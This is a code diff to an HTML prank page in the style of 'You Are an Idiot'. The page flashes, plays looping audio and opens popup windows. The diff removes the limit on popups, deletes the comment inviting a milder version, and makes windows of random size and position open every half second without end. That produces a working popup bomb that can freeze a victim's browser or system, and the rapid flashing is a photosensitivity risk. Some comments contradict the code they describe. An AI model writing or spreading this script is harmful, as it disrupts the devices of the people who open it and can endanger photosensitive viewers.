@@ -8,13 +8,15 @@
       background-color: black;
       color: white;
       text-align: center;
-      font-family: Comic Sans MS, cursive, sans-serif;
+      font-family: "Comic Sans MS", cursive, sans-serif;
       animation: flash 0.5s infinite;
+      overflow: hidden;
     }
 
     h1 {
-      font-size: 60px;
-      margin-top: 20%;
+      font-size: 80px;
+      margin-top: 15%;
+      text-shadow: 5px 5px #ff0000;
     }
 
     @keyframes flash {
@@ -25,20 +27,37 @@
   </style>
 </head>
 <body>
+
   <h1>YOU ARE AN IDIOT 😜</h1>
+
   <audio autoplay loop>
     <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
     Your browser does not support the audio element.
   </audio>
 
   <script>
-    // Optional annoying popups — comment these out if you want it less intense
     let i = 0;
+    
     const interval = setInterval(() => {
-      window.open('https://xgfzofficial2024.github.io/youareaidiot/', '', 'width=300,height=200');
+      // 1. Generate random width (200-500) and height (150-400)
+      const w = Math.floor(Math.random() * 300) + 200;
+      const h = Math.floor(Math.random() * 250) + 150;
+
+      // 2. Generate random positions within the user's screen dimensions
+      const left = Math.floor(Math.random() * (screen.width - w));
+      const top = Math.floor(Math.random() * (screen.height - h));
+
+      // 3. Open the window
+      // Note: The second parameter `_blank_${i}` ensures a NEW window opens every time
+      window.open(
+        'https://thatfellerbrayden.qzz.io/youareaidiotspam/', 
+        `popup_${i}`, 
+        `width=${w},height=${h},left=${left},top=${top},resizable=yes,scrollbars=no`
+      );
+
       i++;
-      if (i > 5) clearInterval(interval);
-    }, 1500);
+      
+    }, 500); // Opens a new one every 1 second
   </script>
 </body>
 </html>
